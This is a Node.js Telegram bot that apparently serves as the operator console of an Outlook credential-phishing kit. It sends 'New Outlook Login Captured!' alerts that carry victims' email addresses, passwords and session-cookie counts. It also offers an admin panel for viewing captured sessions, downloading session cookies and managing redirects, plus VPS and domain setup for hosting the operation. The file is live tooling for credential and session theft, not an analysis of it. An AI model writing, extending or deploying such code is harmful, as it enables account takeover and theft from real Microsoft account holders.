const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

class OutlookNotificationBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');

        // Load persistent subscriptions
        this.loadSubscriptions();

        this.setupCommands();
        this.setupEventHandlers();
        console.log('🚀 Outlook Notification Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;

        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }

        this.rateLimits.set(key, now);

        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }

        return true;
    }

    setupCommands() {
        // Welcome message with main menu
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;

            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }

            this.chatIds.add(chatId);
            this.saveSubscriptions();

            this.sendMainMenu(chatId);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;

            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }

            this.sendHelpMessage(chatId);
        });

        // Menu command to return to main menu
        this.bot.onText(/\/menu/, (msg) => {
            const chatId = msg.chat.id;
            this.sendMainMenu(chatId);
        });
    }

    sendMainMenu(chatId) {
        const welcomeMessage = `
🚀 **Welcome to Outlook Automation Bot!**

Choose an option from the menu below:

🔧 **Admin Features:**
• Admin Panel - Access admin token and management URL

🌐 **VPS Management:**
• Domain Setup - Configure domain and SSL
• System Status - Check server health
• Configuration - Manage settings

❓ **Help:**
• Help - Get information about available commands and features
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🔧 Admin Panel', callback_data: 'admin_panel' }
                ],
                [
                    { text: '🌐 Domain Setup', callback_data: 'domain_setup' },
                    { text: '📊 System Status', callback_data: 'system_status' }
                ],
                [
                    { text: '⚙️ Configuration', callback_data: 'vps_config' }
                ],
                [
                    { text: '❓ Help', callback_data: 'help' }
                ]
            ]
        };

        this.bot.sendMessage(chatId, welcomeMessage, { 
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    }

    sendHelpMessage(chatId) {
        const helpMessage = `
❓ **Outlook Automation Bot Help**

**Available Features:**

🔧 **Admin Features**
• **Admin Panel**: Access admin token and management interface
  - View captured login sessions
  - Download session cookies and data
  - Monitor system analytics
  - Configure system settings

📧 **Notifications**
• **Real-time Login Alerts**: Get notified when new Outlook logins are captured
  - Email addresses and domains
  - Session information
  - Direct links to admin panel

**Commands:**
• **/start** - Show main menu
• **/help** - Show this help message  
• **/menu** - Return to main menu

**Need Help?**
This bot provides notifications and admin access for the Outlook automation project.
        `;

        this.bot.sendMessage(chatId, helpMessage, { 
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;

            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }

            this.handleCallbackQuery(chatId, messageId, query);
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    async handleCallbackQuery(chatId, messageId, query) {
        const data = query.data;

        switch (data) {
            case 'main_menu':
                this.sendMainMenu(chatId);
                break;

            case 'admin_panel':
                await this.handleAdminPanel(chatId, messageId);
                break;

            case 'domain_setup':
                await this.handleDomainSetup(chatId, messageId);
                break;

            case 'system_status':
                await this.handleSystemStatus(chatId, messageId);
                break;

            case 'vps_config':
                await this.handleVPSConfig(chatId, messageId);
                break;

            case 'help':
                this.sendHelpMessage(chatId);
                break;
        }

        this.bot.answerCallbackQuery(query.id);
    }

    async handleAdminPanel(chatId, messageId) {
        const adminToken = global.adminToken || 'Token not available';
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;

        const tokenMessage = `
🔧 <b>Admin Panel Access</b>

🔑 <b>Your Admin Token:</b>
<code>${adminToken}</code>

🌐 <b>Admin Panel URL:</b>
${adminUrl}

<b>How to use:</b>
1. Copy the token above
2. Click "Open Admin Panel" below
3. Enter the token to authenticate
4. Access all admin features and session data

<b>Features Available:</b>
• View all captured login sessions
• Download session cookies and data
• Monitor system analytics
• Configure Cloudflare settings
• Manage redirect destinations

🔒 <b>Security Note:</b> This token provides full administrative access. Keep it secure and don't share it.
        `;

        this.bot.editMessageText(tokenMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                    [{ text: '🔄 Refresh Token', callback_data: 'admin_panel' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Method to send login notifications
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId, password } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;

        const notificationMessage = `
🔐 <b>New Outlook Login Captured!</b>

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Password:</b> <span class="tg-spoiler">${password || 'Not captured'}</span>
🏢 <b>Domain:</b> <code>${domain}</code>
🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
📊 <b>Cookies:</b> ${totalCookies} saved
🆔 <b>Session:</b> ${sessionId}

🌐 Access admin panel to view details and download cookies
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                            [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
                        ]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }

        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }

    // VPS Management Functions
    async handleDomainSetup(chatId, messageId) {
        const exec = require('child_process').exec;
        
        // Get current VPS IP
        exec('curl -s ifconfig.me', async (error, stdout, stderr) => {
            const currentIP = stdout.trim() || 'Unable to detect';
            
            const domainMessage = `
🌐 <b>Domain Setup Guide</b>

<b>Your VPS IP Address:</b> <code>${currentIP}</code>

<b>🔧 Setup Steps:</b>

<b>1. Configure DNS Records:</b>
At your domain provider, add these records:
• <code>A Record: @  →  ${currentIP}</code>
• <code>A Record: www  →  ${currentIP}</code>

<b>2. Update Nginx Configuration:</b>
Commands to run on your VPS:

<pre>sudo nano /etc/nginx/sites-available/outlook-automation
# Change: server_name yourdomain.com www.yourdomain.com;
sudo nginx -t
sudo systemctl restart nginx</pre>

<b>3. Add SSL Certificate:</b>
<pre>sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com</pre>

<b>🌐 Popular Domain Providers:</b>
• Namecheap • GoDaddy • Cloudflare • Google Domains

<b>⏱️ DNS Propagation:</b> 1-24 hours (usually 1-2 hours)

<b>✅ Test when ready:</b>
<code>ping yourdomain.com</code> (should return ${currentIP})
            `;

            this.bot.editMessageText(domainMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📋 Copy IP Address', callback_data: `copy_ip_${currentIP}` }],
                        [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                    ]
                }
            });
        });
    }

    async handleSystemStatus(chatId, messageId) {
        const exec = require('child_process').exec;
        const fs = require('fs');

        // Run multiple system checks
        const checks = [
            'systemctl is-active outlook-automation',
            'systemctl is-active nginx',
            'df -h /',
            'free -h',
            'uptime'
        ];

        let statusResults = [];
        let completed = 0;

        const updateStatus = () => {
            const statusMessage = `
📊 <b>VPS System Status</b>

<b>🚀 Services:</b>
${statusResults.join('\n')}

<b>💾 Disk Usage:</b>
<pre>${statusResults[2] || 'Checking...'}</pre>

<b>🧠 Memory Usage:</b>
<pre>${statusResults[3] || 'Checking...'}</pre>

<b>⏱️ Server Uptime:</b>
<pre>${statusResults[4] || 'Checking...'}</pre>

<b>📈 Application Analytics:</b>
${fs.existsSync('./analytics.json') ? 
    `• Analytics file exists\n• Size: ${Math.round(fs.statSync('./analytics.json').size / 1024)}KB` : 
    '• No analytics data found'}
            `;

            this.bot.editMessageText(statusMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔄 Refresh Status', callback_data: 'system_status' }],
                        [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                    ]
                }
            });
        };

        // Execute each check
        checks.forEach((cmd, index) => {
            exec(cmd, (error, stdout, stderr) => {
                if (index === 0) {
                    statusResults[0] = `• Outlook Service: ${stdout.trim() === 'active' ? '✅ Running' : '❌ Stopped'}`;
                } else if (index === 1) {
                    statusResults[1] = `• Nginx Service: ${stdout.trim() === 'active' ? '✅ Running' : '❌ Stopped'}`;
                } else {
                    statusResults[index] = stdout.trim();
                }
                
                completed++;
                if (completed === checks.length) {
                    updateStatus();
                }
            });
        });

        // Initial message
        statusResults = ['Checking...', 'Checking...', 'Checking...', 'Checking...', 'Checking...'];
        updateStatus();
    }

    async handleVPSConfig(chatId, messageId) {
        const configMessage = `
⚙️ <b>VPS Configuration Management</b>

<b>📂 Important File Locations:</b>

<b>Application:</b>
• App Directory: <code>/opt/outlook-automation</code>
• Configuration: <code>/opt/outlook-automation/.env</code>
• Logs: <code>sudo journalctl -u outlook-automation -f</code>

<b>Nginx:</b>
• Config File: <code>/etc/nginx/sites-available/outlook-automation</code>
• Access Logs: <code>/var/log/nginx/access.log</code>
• Error Logs: <code>/var/log/nginx/error.log</code>

<b>🔧 Common Commands:</b>

<b>Service Management:</b>
<pre>sudo systemctl status outlook-automation
sudo systemctl restart outlook-automation
sudo systemctl restart nginx</pre>

<b>View Logs:</b>
<pre>sudo journalctl -u outlook-automation -f
sudo tail -f /var/log/nginx/error.log</pre>

<b>🔐 Environment Variables (.env):</b>
<pre>AZURE_CLIENT_ID=your_client_id
AZURE_CLIENT_SECRET=your_secret
AZURE_TENANT_ID=your_tenant
AZURE_REDIRECT_URI=https://yourdomain.com/api/auth-callback
ADMIN_TOKEN=your_secure_token
TELEGRAM_BOT_TOKEN=your_bot_token</pre>

<b>🛡️ Security:</b>
• Admin Token: Protected
• Firewall: Port 5000 blocked (nginx proxy only)
• SSL: Managed by Let's Encrypt
        `;

        this.bot.editMessageText(configMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔄 Restart Services', callback_data: 'restart_services' }],
                    [{ text: '📝 View Logs', callback_data: 'view_logs' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }
}

module.exports = OutlookNotificationBot;